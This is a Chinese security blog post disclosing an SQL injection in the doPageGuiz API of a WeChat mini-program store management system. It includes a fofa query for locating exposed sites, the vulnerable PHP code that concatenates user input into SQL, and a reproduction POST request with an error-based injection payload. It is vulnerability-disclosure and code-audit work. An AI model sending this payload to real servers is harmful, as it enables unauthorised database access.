---
title: "万能门店小程序管理系统 /api/wxapps/doPageGuiz SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-doPageGuiz-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopageguiz-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/doPageGuiz SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/13 18:13
- 737浏览
- [0评论](#comment)
- 49分钟阅读

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPageGuiz 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

音频与视频聊天

# 影响版本

万能门店小程序全[开源](#)独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
public function doPageGuiz()
    {
        $uniacid = input("uniacid");
        $suid = input('suid');
        $guize['list'] = Db::name('wd_xcx_recharge')->where("uniacid", $uniacid)->order("money asc")->select();
        foreach ($guize['list'] as $k => &$v) {
            $v['allmoney'] = round($v['money'] + $v['getmoney'], 2);
            $v['coupon_num'] = 0;
            if ($v['coupon_con']) {
                $coupon_con = unserialize($v['coupon_con']);
                foreach ($coupon_con as $key => &$value) {
                    $v['coupon_num'] += $value['coupon_num'];
                }
            }
        }
        $conf = Db::name('wd_xcx_rechargeconf')->where("uniacid", $uniacid)->find();
        if (!$conf) {
            $conf = [
                'score_shoppay' => 0
            ];
        }
        $guize['conf'] = $conf;
        if ($suid) {
            $guize['user'] = Db::name('wd_xcx_superuser')->where("uniacid", $uniacid)->where("id", $suid)->field('money,score,uniacid,id')->find();
        } else {
            $guize['user'] = [
                'money' => 0,
                'score' => 0
            ];
        }

        if ($suid) {
            $tiaojian = " and flag <> 2 and flag = 0";
            $prefix = config('database.prefix');
            $yhqsold = Db::query("select * from {$prefix}wd_xcx_coupon_user where uniacid = " . $uniacid . " and suid = " . $suid . $tiaojian . " ORDER BY id desc");
            $time = time();
            // $aa = [];
            foreach ($yhqsold as $key => &$resi) {
                // $arrs = Db::name('wd_xcx_coupon')->where("uniacid", $uniacid)->where("id", $resi['cid'])->find();
                // if ($arrs['btime'] != 0) {
                //     $arrs['btime'] = date("Y-m-d", $arrs['btime']);
                // }
                // if ($arrs['etime'] != 0) {
                //     if ($time > $arrs['etime'] && $resi['flag'] == 0) {
                //         $kdata = array(
                //             "flag" => 2
                //         );
                //         Db::name('wd_xcx_coupon_user')->where("id", $resi['id'])->update($kdata);
                //     }
                //     $arrs['etime'] = date("Y-m-d", $arrs['etime']);
                // }
                if ($resi['etime'] != 0) {
                    if ($time > $resi['etime'] && $resi['flag'] == 0) {
                        $kdata = array(
                            "flag" => 2
                        );
                        Db::name('wd_xcx_coupon_user')->where("id", $resi['id'])->update($kdata);
                    }
                }
            }
        }

        $guize['coupon'] = Db::name('wd_xcx_superuser')->alias("a")->join("wd_xcx_coupon_user b", "a.id = b.suid")->where("a.uniacid", $uniacid)->where("a.id", $suid)->where("b.flag", 0)->field('b.*')->select();
        foreach ($guize['coupon'] as $ksi => $vsi) {
            if ($vsi['use_type'] == 1) {
                if (strstr($vsi['use_class'], 'gpay') === false) {//不存在
                    unset($guize['coupon'][$ksi]);
                }
            }
        }
        $adata['data'] = $guize;
        return json_encode($adata);
    }
```

代码中使用了 input("uniacid") 和 input("suid") 来接收请求参数。这两个变量的值均来自用户输入

编程

- 在代码中，大部分数据库操作都是通过 ThinkPHP 的链式查询完成的，比如：
  - `Db::name('wd_xcx_recharge')->where("uniacid", $uniacid)->order("money asc")->select();`
  - `Db::name('wd_xcx_rechargeconf')->where("uniacid", $uniacid)->find();`
  - `Db::name('wd_xcx_superuser')->where("uniacid", $uniacid)->where("id", $suid)->field('money,score,uniacid,id')->find();`
  - 以及最后的联表查询
- 这些方法默认会对传入的数据进行参数绑定和预处理，从而较为安全，不容易受到 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)攻击。

存在漏洞的部分在于下面这段代码：

```
if ($suid) {
    $tiaojian = " and flag <> 2 and flag = 0";
    $prefix = config('database.prefix');
    $yhqsold = Db::query("select * from {$prefix}wd_xcx_coupon_user where uniacid = " . $uniacid . " and suid = " . $suid . $tiaojian . " ORDER BY id desc");
    // ...后续处理
}
```

- 关键问题在于：
  - 将变量 `$uniacid` 和 `$suid`（直接来自用户输入）通过字符串拼接的方式嵌入到了 SQL 语句中。
  - SQL 语句的构造过程没有任何额外的过滤、转义或参数绑定，完全依赖用户输入的值组成 SQL 命令。

这就造成最终的SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/doPageGuiz HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1&suid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23
```

[![万能门店小程序管理系统 /api/wxapps/doPageGuiz SQL 注入漏洞](images/img-001-c7cf64f30a24.webp)](https://image.mrxn.net/9fe6f911f2a64245861a5f693c9b50fe.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
